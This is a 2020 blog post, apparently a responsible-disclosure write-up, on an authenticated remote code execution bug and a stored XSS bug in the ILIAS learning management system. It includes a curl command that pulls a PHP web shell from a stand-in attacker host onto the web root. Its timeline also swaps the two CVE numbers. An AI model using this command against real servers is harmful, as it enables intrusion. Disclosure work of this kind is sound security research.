=== Content from medium.com_c127e50e_20250119_125514.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4eda9e120620&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Exploiting ILIAS learning management system

[![Raimonds Liepins](https://miro.medium.com/v2/resize:fill:88:88/0*Cd63ynaJjyJyFuAd.jpg)](https://raimonds-29140.medium.com/?source=post_page---byline--4eda9e120620--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:48:48/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---byline--4eda9e120620--------------------------------)

[Raimonds Liepins](https://raimonds-29140.medium.com/?source=post_page---byline--4eda9e120620--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F9c273286d67c&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&user=Raimonds+Liepins&userId=9c273286d67c&source=post_page-9c273286d67c--byline--4eda9e120620---------------------post_header-----------)

Published in[InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---byline--4eda9e120620--------------------------------)·3 min read·Nov 3, 2020

--

Listen

Share

![]()

On one lonely Saturday evening I got really bored so I picked some random application to look at. This application was ILIAS learning management system.

CVE-2020–25268 — authenticated remote code execution
CVE-2020–25267 — authenticated stored cross site scripting

# CVE-2020–25268

This was the most severe of the vulnerabilities found, it would allow an authenticated user with low privileges to gain code execution.

Upon navigating to Personal -> Overview ILIAS allows you to add external web feeds

![]()

When you send a request it looks something like this on your server

![]()

Hmm, I wonder what’s magepierss 0.72. After a quick search for exploits it showed a bunch of XSS vulnerabilities, however no luck actually exploiting them, since ILIAS html rendering is properly secured.

![]()

Digging a bit into the source code I found that magpie is using a library called snoopy.class.inc which on \_httpsrequest function calls curl through exec. I though to myself, damn this library must be ancient (and it is).

Upon reviewing line 656 you can see the following code

```
exec($this->curl_path.” -D \”/tmp/$headerfile\””.escapeshellcmd($cmdline_params).” “.escapeshellcmd($URI),$results,$return);
```

escapeshellcmd would be good protection if you tried to inject something like “; whoami; hostname” command, but it doesn’t protect if the actual binary can be abused. In this case curl allows for remote fetching of files with a command.

curl <https://maliciousactor.com/shell.php> -o /var/www/html/shell.php

So if you would run the command in the following way you can upload your malicious shell on the web server. Ideally if you know a path where write permissions are allowed.

![]()

This functionality even works if the “Add New Webfeed” is not present as can be seen in the POC, but you would have to know/enumerate for the Cmdnode parameters.

[## fixed bug #28867 · ILIAS-eLearning/ILIAS@fa10f16

### You can't perform that action at this time. You signed in with another tab or window. You signed out in another tab or…

github.com](https://github.com/ILIAS-eLearning/ILIAS/commit/fa10f165476c449efba6d8a3b5a55df77146e96a?source=post_page-----4eda9e120620--------------------------------)

Authenticated code execution on ILIAS

# CVE-2020–25267

This was a low priority type of vulnerability that would allow an attacker to store XSS, however to actually exploit this you would require mid level permissions to create Question Pools.

Question Pools allow file uploads, however are properly restricted to disallow any PHP and other types of files. After a closer observation I noticed that you could add a HTML extension for file.

![]()

After that you would need to run the pool and upload you html file containing the payload and open it in preview.

![]()

<https://www.youtube.com/watch?v=wI5UlOXunl0&feature=youtu.be>

# Cherry on top —Unauthenticated Reflected XSS

This exploit was not originally found by me so I will not be taking credit for it, however sometimes doing a simple Google search returns still valid and exploitable vulnerabilities

<https://www.openbugbounty.org/reports/70516/>

# Disclosure timeline

06/09/2020 — Reported the issue

10/09/2020 — Tickets created for fixing

17/09/2020 —Code Execution vulnerability addressed (CVE-2020–25267) and verified as fixed

23/10/2020 — ILIAS 6.5 and 5.4.18 released containing the fix

[Security](https://medium.com/tag/security?source=post_page-----4eda9e120620--------------------------------)[Ilias](https://medium.com/tag/ilias?source=post_page-----4eda9e120620--------------------------------)[Code Review](https://medium.com/tag/code-review?source=post_page-----4eda9e120620--------------------------------)[Pentesting](https://medium.com/tag/pentesting?source=post_page-----4eda9e120620--------------------------------)[Exploit](https://medium.com/tag/exploit?source=post_page-----4eda9e120620--------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--4eda9e120620--------------------------------)[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--4eda9e120620--------------------------------)[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--4eda9e120620--------------------------------)[50K Followers](/followers?source=post_page---post_publication_info--4eda9e120620--------------------------------)·[Last published 5 hours ago](/finding-my-first-sql-injection-on-hackerone-6a031ab5aa1c?source=post_page---post_publication_info--4eda9e120620--------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

[![Raimonds Liepins](https://miro.medium.com/v2/resize:fill:96:96/0*Cd63ynaJjyJyFuAd.jpg)](https://raimonds-29140.medium.com/?source=post_page---post_author_info--4eda9e120620--------------------------------)[![Raimonds Liepins](https://miro.medium.com/v2/resize:fill:128:128/0*Cd63ynaJjyJyFuAd.jpg)](https://raimonds-29140.medium.com/?source=post_page---post_author_info--4eda9e120620--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F9c273286d67c&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&user=Raimonds+Liepins&userId=9c273286d67c&source=post_page-9c273286d67c--post_author_info--4eda9e120620---------------------follow_profile-----------)[## Written by Raimonds Liepins](https://raimonds-29140.medium.com/?source=post_page---post_author_info--4eda9e120620--------------------------------)[66 Followers](https://raimonds-29140.medium.com/followers?source=post_page---post_author_info--4eda9e120620--------------------------------)·[5 Following](https://medium.com/%40raimonds-29140/following?source=post_page---post_author_info--4eda9e120620--------------------------------)

Opinions are my own and not the views of my employer

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F9c273286d67c&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fexploiting-ilias-learning-management-system-4eda9e120620&user=Raimonds+Liepins&userId=9c273286d67c&source=post_page-9c273286d67c--post_author_info--4eda9e120620---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----4eda9e120620--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----4eda9e120620--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----4eda9e120620--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----4eda9e120620--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----4eda9e120620--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----4eda9e120620--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----4eda9e120620--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----4eda9e120620--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----4eda9e120620--------------------------------)[Teams](https://medium.com/business?source=post_page-----4eda9e120620--------------------------------)


